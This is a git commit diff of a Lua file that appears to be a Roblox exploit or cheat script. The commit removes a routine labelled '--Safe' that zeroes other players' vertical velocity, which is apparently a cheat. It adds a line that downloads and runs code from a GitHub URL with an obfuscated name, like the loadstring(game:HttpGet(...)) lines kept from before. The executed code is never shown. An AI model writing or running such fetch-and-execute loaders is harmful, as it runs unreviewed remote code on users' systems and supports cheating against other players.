5c9ad67e9d7817591eb282279d8877379ae371a2
fdsmogk <121389294+fdsmogk@users.noreply.github.com>
2023-02-03 20:10:21 +0500

    Update lllalallala.lua

--- lllalallala.lua
+++ lllalallala.lua
@@ -8,34 +8,4 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/fdsmogk/wgrijndsapmoi
 loadstring(game:HttpGet("https://raw.githubusercontent.com/fdsmogk/htsrshtroipndsoijdshtjoihdtsff0hoihjsi/main/fjfszfjtsjdtzsj", true))()
 
 --Safe
-local RunService = game:GetService("RunService")
-
-local function zeroOutYVelocity(hrp)
-    hrp.Velocity = Vector3.new(hrp.Velocity.X, 0, hrp.Velocity.Z)
-    hrp.AssemblyLinearVelocity = Vector3.new(hrp.Velocity.X, 0, hrp.Velocity.Z)
-end
-
-local function onPlayerAdded(player)
-    player.CharacterAdded:Connect(function(character)
-        local hrp = character:WaitForChild("HumanoidRootPart")
-        zeroOutYVelocity(hrp)
-    end)
-end
-
-local function onPlayerRemoving(player)
-    player.CharacterAdded:Disconnect()
-end
-
-game.Players.PlayerAdded:Connect(onPlayerAdded)
-game.Players.PlayerRemoving:Connect(onPlayerRemoving)
-
-RunService.Heartbeat:Connect(function()
-    pcall(function()
-        for i, player in pairs(game.Players:GetChildren()) do
-            if player.Name ~= game.Players.LocalPlayer.Name then
-                local hrp = player.Character.HumanoidRootPart
-                zeroOutYVelocity(hrp)
-            end
-        end
-    end)
-end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/fdsmogk/hrehetrhjsftjhfj/main/hdjtsrfjtsfjxgsxfjskxfjskfjkfjfjg", true))()
